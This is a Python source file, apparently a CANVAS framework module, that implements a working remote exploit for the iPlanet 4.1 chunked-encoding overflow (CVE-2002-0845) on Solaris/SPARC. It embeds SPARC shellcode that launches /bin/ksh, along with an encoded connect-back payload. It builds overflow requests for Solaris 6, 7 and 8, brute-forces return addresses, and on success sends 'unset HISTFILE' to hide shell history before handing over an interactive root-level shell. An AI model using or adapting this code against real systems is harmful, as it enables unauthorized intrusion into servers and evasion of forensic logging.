#! /usr/bin/env python
"""


"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2003
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""


"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: sinan.eren@immunityinc.com
#

import os,getopt
import sys


sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *
sys.path.append('encoder')
import addencoder
sys.path.append("shellcode")
import win32shell
import time
from tcpexploit import tcpexploit
import urllib
from sunrpc import *
import random
import xdrlib
import canvasengine

import string
import struct
import random
import select

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

import unixShellNode

NAME="iPlanet Chunked Encoding"
#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun and Netscape"
DOCUMENTATION["Date public"]="08/08/2002"
DOCUMENTATION["CERT Advisory"]="http://www.kb.cert.org/vuls/id/516648"
DOCUMENTATION["CVE Name"] = "CVE-2002-0845"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0845"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"]="http://www.sun.com/service/sunone/software/alerts/transferencodingalert-23july2002.html http://www.eeye.com/html/Research/Advisories/AD20020808a.html"
DOCUMENTATION["Usage Notes"]="Requires a POSTABLE url. Any postable url will do. The exploit will tell you if the url you gave it was not postable. This exploit has old findsck shellcode in it, and will not work from behind a NAT."             
DOCUMENTATION["Development Notes"]="Exploit tested against IPlanet version 4.1 SP7, SP3, and SP9 on Solaris 9, 8 and 7 (sun4u)\n"+\
                                   "Install media: enterprise-4.1SP9-domestic-us.sparc-sun-solaris2.6.tar.gz\n"+\
                                   "Solaris 8 media Bonus Software CD: iPlanet Advantage Software volume 2:\n"+\
                                   "bash-2.03# strings /usr/netscape/server4/bin/https/bin/ns-httpd | grep iPlanet-WebServer-Enterprise\niPlanet-WebServer-Enterprise/4.1SP7"
DOCUMENTATION["Post-Exploitation"]="WARNING: iPlanet web server will not serve web pages till you exit the shell listener."

DESCRIPTION="iPlanet Chunked Encoding Overflow"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Solaris", "sparc"] ]
PROPERTY["VERSION"]= ["7", "8", "9"] 


GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

PORT = 80

class IPlanetException(Exception):
    
    def __init__(self, args=None):
        self.args = args
        
    def __str__(self):
        return `self.args`

class IPlanetExploit:

    def __init__(self, target, url="", port=PORT):
        self.set_target(target)
        self.set_port(port)
        self.set_url(url)
        self.name=NAME
        
    def get_shellcode(self, lport):
        #LSD-pl findsck XXX: REPLACE
        #FIXME
        shellcode =\
        "\x20\xbf\xff\xff"+\
        "\x20\xbf\xff\xff"+\
        "\x7f\xff\xff\xff"+\
        "\x33\x02"+ struct.pack(">h", lport)+\
        "\xa0\x10\x20\xff"+\
        "\xa2\x10\x20\x54"+\
        "\xa4\x03\xff\xd0"+\
        "\xaa\x03\xe0\x28"+\
        "\x81\xc5\x60\x08"+\
        "\xc0\x2b\xe0\x04"+\
        "\xe6\x03\xff\xd0"+\
        "\xe8\x03\xe0\x04"+\
        "\xa8\xa4\xc0\x14"+\
        "\x02\xbf\xff\xfb"+\
        "\xaa\x03\xe0\x5c"+\
        "\xe2\x23\xff\xc4"+\
        "\xe2\x23\xff\xc8"+\
        "\xe4\x23\xff\xcc"+\
        "\x90\x04\x20\x01"+\
        "\xa7\x2c\x60\x08"+\
        "\x92\x14\xe0\x91"+\
        "\x94\x03\xff\xc4"+\
        "\x82\x10\x20\x36"+\
        "\x91\xd0\x20\x08"+\
        "\x1a\xbf\xff\xf1"+\
        "\xa0\xa4\x20\x01"+\
        "\x12\xbf\xff\xf5"+\
        "\xa6\x10\x20\x03"+\
        "\x90\x04\x20\x02"+\
        "\x92\x10\x20\x09"+\
        "\x94\x04\xff\xff"+\
        "\x82\x10\x20\x3e"+\
        "\xa6\x84\xff\xff"+\
        "\x12\xbf\xff\xfb"+\
        "\x91\xd0\x20\x08"+\
        "\x20\xbf\xff\xff"+\
        "\x20\xbf\xff\xff"+\
        "\x7f\xff\xff\xff"+\
        "\x90\x03\xe0\x20"+\
        "\x92\x02\x20\x10"+\
        "\xc0\x22\x20\x08"+\
        "\xd0\x22\x20\x10"+\
        "\xc0\x22\x20\x14"+\
        "\x82\x10\x20\x0b"+\
        "\x91\xd0\x20\x08"+\
        "/bin/ksh"
        
        #noir-connectback encoded by the polymorph engine
        shellcode1 =\
        "\xb8\xa0\x3c\x22\x2e\xbf\xff\xff\x38\xbf"+\
        "\xff\xff\x7f\xff\xff\xff\xa4\x03\xe0\x3c"+\
        "\xa2\x1c\xc0\x13\xe0\x04\xbf\xf8\xe6\x04"+\
        "\xbf\xfc\xa6\x1c\xc0\x10\xe6\x24\xbf\xfc"+\
        "\xa4\x04\xa0\x04\xa2\x04\x60\x01\x80\xa4"+\
        "\x60\xa0\x06\xbf\xff\xfa\x81\xdc\xbf\xf8"+\
        "\x26\xbf\xff\xe6\x0b\xd5\xfe\x66"+\
        "\x2b\x6a\x01\x99\x2b\x6a\x01\x99\x74\x2a"+\
        "\x01\x99\x9b\xc5\xde\x64\x99\xc5\xde\x64"+\
        "\x9f\xcf\x7e\x6c\x9d\xcf\x3e\x6d\x93\xc5"+\
        "\xde\x67\x89\xc5\xde\x80\x9a\x05\xde\x6e"+\
        "\xaf\xc5\xde\x64\xae\xf9\x5e\x76\xaf\xc1"+\
        "\x5e\x36\xef\xf6\x1e\xee\x8f\xf7\xde\x67"+\
        "\x99\xd6\x1e\xee\x9f\xc5\xde\x76\x9d\xc5"+\
        "\xde\x67\x89\xc5\xde\x8d\x9a\x05\xde\x6e"+\
        "\xa9\xc9\xbe\x77\x9b\xf5\x41\x99\x99\xc5"+\
        "\xde\x6f\x9f\xd9\xbe\x77\x89\xc5\xde\x58"+\
        "\x9a\x05\xde\x6e\xa9\xd1\x9e\x67\x8b\x71"+\
        "\x9e\x64\x0f\x6a\x01\x9f\x9b\xd6\x1e\xf6"+\
        "\x99\xd7\xde\x76\xcb\xf7\xde\x6e\xdb\xf7"+\
        "\xde\x76\xcb\xf7\xde\x72\x89\xc5\xde\x6d"+\
        "\x9a\x05\xde\x6e\x4a\x97\xbd\x25\xa7\xc5"+\
        "\xa5\xd0\x24\xb7\x97\x08\x24\xbe\x8d\x0e"
        return shellcode

    def set_target(self, target):
        try:
            self.targethost = socket.gethostbyname(target)
        except socket.gaierror, err:
            raise IPlanetException, "IPlanetExploit, Host: " + target + " " + err[1]

    def get_target(self):
        return self.targethost

    def set_port(self, port):
        self.port = port

    def get_port(self):
        return self.port

    def set_url(self, url):
        if len(url) < 1:
            self.url = ""
        elif url[0] == "/":
            self.url = url[1:]
        else:
            self.url = url
        
    def get_url(self):
        return url
    
    def setup(self):
        try:
            self.sck = self.gettcpsock()
            self.sck.connect((self.targethost, self.port))
        except:
            raise IPlanetException, "IPlanetExploit: Communication failure. Host: " + str(self.targethost) + ":"\
                  + str(self.port)

    def test_attack(self, fromrun = 0):
        
        hdrstr = "POST /%s HTTP/1.0\r\n\r\n"

        self.setup()

        rd, wr, ex = select.select([], [self.sck], [], 8)
        
        if not wr:
            raise IPlanetException, "Can not write to socket."

        print hdrstr % self.url

        self.sck.send(hdrstr % self.url)
        
        time.sleep(0.5)
        
        rd, wr, ex = select.select([self.sck], [], [], 3)
        
        if rd:
            recvbuf = ""
            try:
                recvbuf = self.sck.recv(100000)
            except:
                pass
            
            print recvbuf

            if len(recvbuf) > 0:
                if recvbuf.find("Netscape-Enterprise/4.1") != -1:
                    #first step passed!
                    if fromrun:
                        if recvbuf.find("Method Not Allowed") != -1 or recvbuf.find("Server Error") != -1:
                            self.log("Remote end is possibly vulnerable but the url supplied is not good for POST method.")
                            self.log("Please, replace with a POSTable url. (eg: /cgi-bin/someformcgi)")
                            return 0
                        else:
                            self.log("Remote end is possibly vulnerable and the url seems to be ok for POST method.")
                            return 1
                    else:
                        return 1
            else:
                return 0
        
    def exploit_sol8(self, addr, delta=1000000):
        """payload generation for Solaris 8 sun4u 64 + IPlanet WS 4.1 SP7"""
        
        hdrstr = "POST /%s HTTP/1.1\r\nHost: localhost\r\n"\
                 + "Transfer-Encoding: chunked\r\nContent-Length: %d\r\n\r\n"
        expstr = "4\r\nMOKA\r\n7FFFFFFF\r\n"
                 

        self.setup()
        self.ovf = ""

        o0addr = addr
        g1addr = o0addr - delta
                            #300000 ??changed for friend's box.
                            #delta for friend's box: 1000000 home box: 300000
        funcptr = g1addr - 300000
        sigill = 0xdeadcafeL
        nop = 0x2d3fed71L
        
        self.lport = self.sck.getsockname()[1]
        
        #self.log("local port: %d" % self.lport)

        self.shellcodez = self.get_shellcode(self.lport)
        
        self.log("o0 addr: 0x%.8x addr delta: %d g1addr: 0x%.8x funcptr: 0x%.8x" % (addr, delta, g1addr, funcptr))
        
        self.ovf = struct.pack(">L", nop)*(340000/4)
        self.ovf += self.shellcodez
        self.ovf += struct.pack(">L", funcptr)*(300000/4)       
        self.ovf += struct.pack(">L", g1addr)*(3000000/4)

        #raw_input("attach")
        
        self.ovf = hdrstr % (self.url, len(expstr+self.ovf)) + expstr + self.ovf + "\r\n\r\n\r\n\r\n"

        #print hdrstr % (self.url, len(expstr+self.ovf))     
        #print self.ovf

        rd, wr, ex = select.select([], [self.sck], [], 8)
        
        if not wr:
            raise IPlanetException

        self.sck.send(self.ovf)
        
        time.sleep(1.1)
        
        rd, wr, ex = select.select([self.sck], [], [], 3)
        
        if rd:
            recvbuf = ""
            try:
                recvbuf = self.sck.recv(100000)
            except:
                pass
            if len(recvbuf) > 100:
                pass    #eatgarbage() deals with this
            else:
                #print recvbuf
                pass
            
        time.sleep(0.1)
                
        return self.check_bd()
        
        #self.sck.close()

    def exploit_sol7(self, addr, delta=50000):
        """payload generation for Solaris 7 sun4u 64 + IPlanet WS 41 SP7"""
        
        hdrstr = "POST /%s HTTP/1.1\r\nHost: localhost\r\n"\
                 + "Transfer-Encoding: chunked\r\nContent-Length: %d\r\n\r\n"
        expstr = "4\r\nMOKA\r\n7FFFFFFF\r\n"
                 

        self.setup()
        self.ovf = ""

        o0addr = addr  
        g1addr = o0addr - delta #delta for sol 7 sun4u 64 + IP4.1SP7
                                #make deltas modular! DONE
        funcptr = g1addr - 100000
        sigill = 0xdeadcafeL
        nop = 0x2d3fed71L
        
        self.lport = self.sck.getsockname()[1]
        
        #self.log("local port: %d" % self.lport)

        self.shellcodez = self.get_shellcode(self.lport)
        
        self.log("o0 addr: 0x%.8x delta: %d g1addr: 0x%.8x funcptr: 0x%.8x" % (addr, delta, g1addr, funcptr))

        #sol 7 setup
        #
        self.ovf = struct.pack(">L", nop)*(200000/4)
        self.ovf += self.shellcodez
        self.ovf += struct.pack(">L", funcptr)*(50000/4)       
        self.ovf += struct.pack(">L", g1addr)*(3000000/4)

        #raw_input("attach")
        
        self.ovf = hdrstr % (self.url, len(expstr+self.ovf)) + expstr + self.ovf + "\r\n\r\n\r\n\r\n"

        #print hdrstr % (self.url, len(expstr+self.ovf))
        
        #print self.ovf

        rd, wr, ex = select.select([], [self.sck], [], 8)
        
        if not wr:
            raise IPlanetException

        self.sck.send(self.ovf)
        
        time.sleep(1.1)
        
        rd, wr, ex = select.select([self.sck], [], [], 3)
        
        if rd:
            recvbuf = ""
            try:
                recvbuf = self.sck.recv(100000)
            except:
                pass
            if len(recvbuf) > 100:
                pass    #eatgarbage() deals with this
            else:
                #print recvbuf
                pass
            
        time.sleep(0.1)
                
        return self.check_bd()
        
        #self.sck.close()

    def exploit_sol6(self, addr, delta=1500000):
        """payload generation for Solaris 6 sun4u 64 + IPlanet WS 4.1 SP9"""
        
        hdrstr = "POST /%s HTTP/1.1\r\nHost: localhost\r\n"\
                 + "Transfer-Encoding: chunked\r\nContent-Length: %d\r\n\r\n"
        expstr = "4\r\nMOKA\r\n7FFFFFFF\r\n"
                 

        self.setup()
        self.ovf = ""

        i0addr = addr
        shelladdr = i0addr - delta

        sigill = 0xdeadcafeL
        nop = 0x2d3fed71L
        jmpnop = 0x10800012 #jump 72 bytes
        
        self.lport = self.sck.getsockname()[1]
        
        #self.log("local port: %d" % self.lport)

        self.shellcodez = self.get_shellcode(self.lport)
        
        self.log("i0_addr: 0x%.8x addr_delta: %d shellcode: 0x%.8x" % (addr, delta, shelladdr))
        
        self.ovf = struct.pack(">L", jmpnop)*(200000/4)
        self.ovf += struct.pack(">L", nop)*20
        self.ovf += self.shellcodez
        #self.ovf += struct.pack(">L", funcptr)*(500000/4)       
        self.ovf += struct.pack(">L", shelladdr)*(2000000/4)

        #raw_input("attach exploit_sol6")
        
        self.ovf = hdrstr % (self.url, len(expstr+self.ovf)) + expstr + self.ovf + "\r\n\r\n\r\n\r\n"

        #print hdrstr % (self.url, len(expstr+self.ovf))     
        #print self.ovf

        rd, wr, ex = select.select([], [self.sck], [], 3)
        
        if not wr:
            raise IPlanetException

        self.sck.send(self.ovf)
        
        time.sleep(1.1)
        
        rd, wr, ex = select.select([self.sck], [], [], 2)
        
        if rd:
            recvbuf = ""
            try:
                recvbuf = self.sck.recv(100000)
            except:
                pass
            if len(recvbuf) > 100:
                pass    #eatgarbage() deals with this
            else:
                #print recvbuf
                pass
            
        time.sleep(0.1)
                
        return self.check_bd()
        
        #self.sck.close()

    def attack_sol8(self):
        #the ugly
        self.exploit_sol8(0xdeadbeefL)
        time.sleep(1.5)
        
        #the well known
        o0list = [ 0xa9b8ec, 0x7d4d40, 0x8b79a0, 0x60bdc0, 0x997bf0, 0x9914c8, 0xae4ccc, 0xb2e0a8, 0xb77488, 0x9df500, 0xa0ea88 ] #Solaris 8 sun4u + IPlanet WS 4.1 SP7
        delta = [300000, 1000000]
        
        for each in o0list:
            for each1 in delta:
                if self.exploit_sol8(each, each1):
                    return 1
                time.sleep(1.5)
                if self.exploit_sol8(each, each1):
                    return 1
                time.sleep(1.5)

        #the unknown
        each = 0x700000
        while each < 0xc00000:
            self.log("trying %%o0: 0x%.8x" % each)
            for each1 in delta:
                if self.exploit_sol8(each, each1):
                    return 1
                time.sleep(1)
                #try each offset twice!!
                if self.exploit_sol8(each, each1):
                    return 1
            each += 0x10000
            time.sleep(1)
        return 0
 
    def attack_sol7(self):
        #the ugly
        self.exploit_sol7(0xdeadbeefL)
        time.sleep(1.5)
        
        #the well known
        o0list = [ 0x874690, 0x880b58, 0x78f360, 0x79fbb0, 0x79fb10, 0x7a17d0, 0x6b2fd0 ]
                   #solaris 7 sun4u 64 + IP41SP7
        delta = [50000]
        
        for each in o0list:
            for each1 in delta:
                if self.exploit_sol7(each, each1):
                    return 1
                time.sleep(1.5)
                if self.exploit_sol7(each, each1):
                    return 1
                time.sleep(1.5)

        #the unknown
        each = 0x700000
        while each < 0xc00000:
            self.log("trying %%o0: 0x%.8x" % each)
            for each1 in delta:
                if self.exploit_sol7(each, each1):
                    return 1
                time.sleep(1)
                #try each offset twice!!
                if self.exploit_sol7(each, each1):
                    return 1
            each += 0x10000
            time.sleep(1)

        return 0 

    def attack_sol6(self):
        #the ugly
        #self.exploit_sol6(0x41414141)
        time.sleep(1.5)
        
        #the well known actually this is %i0 list!! 
        #0xef6f23e4 <__0fJrawStreamL_read_blockv+60>:    ld  [ %i0 ], %o3
        #0xef6f23e8 <__0fJrawStreamL_read_blockv+64>:    cmp  %o3, 0
        #0xef6f23ec <__0fJrawStreamL_read_blockv+68>:    be  0xef6f2404 <__0fJrawStreamL_read_blockv+92>
        #0xef6f23f0 <__0fJrawStreamL_read_blockv+72>:    add  %i0, 0x14, %o1
        #0xef6f23f4 <__0fJrawStreamL_read_blockv+76>:    call  %o3   !!!this is it!!!

        o0list = [ 0xa79db8, 0xaa5260, 0xa73a48, 0x90edc8, 0x9404b8, 0x93b340, 0x9495d8, 0x94a808, 0x9744c0, 0x9785e0, 0x981280]
                   #solaris 6 sun4u 32 + IP41SP9
        delta = [1480000, 1500000, 1600000]
        
        for each in o0list:
            for each1 in delta:
                if self.exploit_sol6(each, each1):
                    return 1
                time.sleep(1.5)
                if self.exploit_sol6(each, each1):
                    return 1
                time.sleep(1.5)

        #the unknown
        each = 0x900000
        while each < 0x9f0000:
            self.log("trying %%o0: 0x%.8x" % each)
            for each1 in delta:
                if self.exploit_sol6(each, each1):
                    return 1
                time.sleep(1)
                #try each offset twice!!
                if self.exploit_sol6(each, each1):
                    return 1
            each += 0x1000
            time.sleep(1)

        return 0

    def eatgarbage(self):

        while 1:

            #print "eating garbage ...\r",
            try:
                rd, wr, ex = select.select([self.sck], [], [], 5)
                
                if not rd:
                    return

                recvbuf = self.sck.recv(100000)
                if not len(recvbuf):
                    return
                
            except:
                return
            
                
    def check_bd(self):

        #self.proxy()
        
        try:

            self.eatgarbage()
            #print "\n"
            
            rd, wr, ex = select.select([], [self.sck], [], 5)

            if not wr:
                return 0
            
            #print "writing"
            self.sck.send("echo FOO;unset HISTFILE;echo FOO;FOO\n")
            
            rd, wr, ex = select.select([self.sck], [], [], 5)

            if not rd:
                return 0

            #print "reading"
            bufown = self.sck.recv(8000)
            #print bufown
            
            if bufown.find("FOO") != -1:
                self.log("got response, Success!")
                #self.proxy()
                return 1
            
        except socket.error:
            pass

        return 0
    
    def proxy(self):
        
        self.t = Telnet()
        self.t.sock = self.sck
        self.t.write("unset HISTFILE;uname -a;\n")
        self.t.interact()
        sys.exit(1)

class theexploit(tcpexploit, IPlanetExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00\\/.:?\r\n%?"
        self.filename="/search"
        self.cmdline = 0
        return

    def createShellcode(self):
        pass
                
    def neededListenerTypes(self):
        return []
        
    def test(self):
        self.host = self.target.interface
        try:
            self.port = int(self.argsDict["port"])
        except:
            self.port = 80
        try:
            self.filename = self.argsDict["posturl"]
        except:
            print "PostURL not set, using default of /search"
            self.filename = "search"

        self.log("using url %s for POST method" % self.filename)
        time.sleep(2)
        
        IPlanetExploit.__init__(self, self.host, self.filename, 80)
        try:
            if self.test_attack():
                #self.log("IPlanet 4.1 WS is running and vulnerable on remote end.")
                return 1
        except:
            return 0
        
        self.log("IPlanet 4.1 WS is not running or not vulnerable.")
        return 0
        
    def run(self):
        self.host = self.target.interface
        try:
            self.port = int(self.argsDict["port"])
        except:
            self.port = 80
        try:
            self.filename = self.argsDict["posturl"]
            print "POSTurl set to: %s"%self.filename
        except:
            print "POSTurl not set, using default of /search"
            self.filename = "search"

        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        try:
            return self.dorun()
        except IPlanetException, self.expstr:
            self.log(str(self.expstr))
            return 0
        
    def dorun(self):
        
        IPlanetExploit.__init__(self, self.host, self.filename, self.port)

        if self.test_attack(1):
            pass
        else:
            self.log("IPlanet does not seem to be running or vulnerable.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
        n = 0
        if not self.version:
            self.log("attack type: Solaris 8 + iPlanet 4.1.")
            n = self.attack_sol8()
        elif self.version == 1:
            self.log("attack type: Solaris 7 + iPlanet 4.1.")
            n = self.attack_sol7()
        elif self.version == 2:
            self.log("attack type: Solaris 2.6 + iPlanet 4.1.")
            n = self.attack_sol6()
            #return 0
        
        if not n:
            self.log("Exploitation failed.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
        self.setInfo("%s attacking %s:%d - done (succeeded!)"%(NAME,self.host,self.port))
        if self.cmdline:
            self.proxy()
            return
        
        self.tn = Telnet()
        self.tn.sock = self.sck
        
        try:
            shell=shelllistener(shellfromtelnet(self.tn))
        except :
            self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            return 0

        node = unixShellNode.unixShellNode()
        node.parentnode=self.argsDict["passednodes"][0]
        node.shell = shell
        return node

    def displayVersions(self):
        print "0 : Solaris 8/9 sun4u + IPlanet 4.1 upto SP11"
        print "1 : Solaris 7 sun4u + IPlanet 4.1 upto SP11"
        print "2 : Solaris 2.6 sun4u + IPlanet 4.1 upto SP11"
        return
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    app.cmdline = 1
    app.options = ["-O posturl:url_to_post"]
    ret=standard_callback_commandline(app)    
